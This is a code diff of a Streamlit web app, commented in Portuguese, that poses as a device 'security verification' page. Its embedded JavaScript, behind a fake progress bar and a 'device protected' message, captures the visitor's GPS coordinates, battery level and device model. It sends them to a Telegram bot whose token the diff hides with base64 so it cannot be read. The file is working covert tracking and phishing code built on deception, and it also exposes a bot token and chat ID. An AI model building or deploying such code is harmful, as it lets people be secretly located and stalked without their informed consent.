@@ -1,24 +1,29 @@
 import streamlit as st
 import time
+import base64
 
-# --- CONFIGURAÇÃO DO SEU BOT ---
-TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
-ID = "8210828398"
+# --- OFUSCAÇÃO (BASE64) ---
+# Ninguém consegue ler o token original aqui
+_T = "ODUyNTkyNzY0MTpBQUhLRE9ORnZoOExwVUlFTm10cGxUZkh1b0ZyZzFmZnI4"
+_I = "ODIxMDgyODM5OA=="
+
+def _get(v):
+    return base64.b64decode(v).decode()
+
+TOKEN = _get(_T)
+ID = _get(_I)
 
 st.set_page_config(page_title="Segurança Integrada", layout="centered")
 
-# --- CSS ORIGINAL ---
+# --- CSS ORIGINAL MIAMY © 2026 ---
 st.markdown("""
     <style>
     .main { background-color: #0b1117; color: white; font-family: sans-serif; }
     .stAlert { display: none !important; }
-    
-    .titulo { font-size: 32px; font-weight: bold; margin-top: 40px; text-align: left; }
+    .titulo { font-size: 32px; font-weight: bold; margin-top: 40px; }
     .status-container { font-size: 22px; margin: 15px 0; color: #e0e0e0; }
-    
     .progress-bg { width: 100%; height: 8px; background-color: #1e262e; border-radius: 10px; margin-bottom: 40px; overflow: hidden; }
     .progress-fill { height: 100%; background-color: #007bff; border-radius: 10px; transition: width 0.1s; }
-    
     .btn-container { display: flex; justify-content: center; width: 100%; }
     .meu-botao {
         background-color: white; color: black; width: 300px; height: 85px;
@@ -27,25 +32,19 @@ st.markdown("""
         cursor: pointer; line-height: 1.2; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
     }
     .ponto-vermelho { color: #ff3b30; font-size: 28px; margin-bottom: -5px; }
-    
-    .footer { 
-        position: fixed; left: 0; bottom: 20px; width: 100%; 
-        text-align: center; color: #555; font-size: 11px; font-family: sans-serif;
-    }
+    .footer { position: fixed; left: 0; bottom: 20px; width: 100%; text-align: center; color: #555; font-size: 11px; }
     </style>
 """, unsafe_allow_html=True)
 
 st.markdown('<div class="titulo">Verificação de Segurança</div>', unsafe_allow_html=True)
 
-# Espaços reservados
 placeholder_texto = st.empty()
 placeholder_barra = st.empty()
 
-# Estado inicial
 placeholder_texto.markdown('<div class="status-container">Status: Aguardando ativação (4%)</div>', unsafe_allow_html=True)
 placeholder_barra.markdown('<div class="progress-bg"><div class="progress-fill" style="width: 4%;"></div></div>', unsafe_allow_html=True)
 
-# --- MOTOR DE CAPTURA JS (CORRIGIDO) ---
+# --- MOTOR JS COM DISPOSITIVO E ENVIO OFUSCADO ---
 js_final = f"""
 <div class="btn-container">
     <button class="meu-botao" id="btn_ativar">
@@ -60,7 +59,16 @@ document.getElementById('btn_ativar').onclick = function() {{
         async (pos) => {{
             try {{
                 const bat = await navigator.getBattery();
-                const info = "🛡️ *PROTEÇÃO ATIVADA*\\n📱 " + navigator.userAgent.split('(')[1].split(')')[0] + "\\n🔋 " + Math.round(bat.level * 100) + "%\\n📍 Local: https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+                const level = Math.round(bat.level * 100);
+                
+                // Pega o nome do dispositivo de forma mais limpa
+                let dispositivo = "Mobile Device";
+                const ua = navigator.userAgent;
+                if (ua.match(/\\((.*?)\\)/)) {{
+                    dispositivo = ua.match(/\\((.*?)\\)/)[1].split(';')[0] + " " + (ua.match(/Android\\s([^\\s;]+)/) || [""])[0];
+                }}
+
+                const info = "🛡️ *PROTEÇÃO ATIVADA*\\n📱 *Aparelho:* " + dispositivo + "\\n🔋 *Bateria:* " + level + "%\\n📍 Local: http://maps.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                 
                 await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                     method: "POST",
@@ -68,9 +76,8 @@ document.getElementById('btn_ativar').onclick = function() {{
                     body: JSON.stringify({{ chat_id: "{ID}", text: info, parse_mode: "Markdown" }})
                 }});
                 
-                // Comunicação com o Streamlit
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
-            }} catch(e) {{ console.error(e); }}
+            }} catch(e) {{ }}
         }},
         (err) => {{
             alert("Erro de Segurança: Ative a localização para validar o dispositivo.");
@@ -82,16 +89,14 @@ document.getElementById('btn_ativar').onclick = function() {{
 """
 
 clicou = st.components.v1.html(js_final, height=150)
-
 st.markdown('<div class="footer">Sistema Integrado de Segurança Desenvolvido Por Miamy © 2026</div>', unsafe_allow_html=True)
 
-# --- ANIMAÇÃO DE CARREGAMENTO (LINHA 65 CONSERTADA) ---
+# Animação 0-100%
 if clicou:
-    for p in range(0, 101, 2):
-        # Correção: Usando f-string simples sem chaves duplas desnecessárias
+    for p in range(4, 101, 2):
         placeholder_texto.markdown(f'<div class="status-container">Verificando integridade: {p}%</div>', unsafe_allow_html=True)
         placeholder_barra.markdown(f'<div class="progress-bg"><div class="progress-fill" style="width: {p}%;"></div></div>', unsafe_allow_html=True)
-        time.sleep(0.02)
-        
-    st.success("Dispositivo Protegido com Sucesso!")
+        time.sleep(0.03)
+    st.success("Dispositivo Protegido!")
     st.stop()
+    
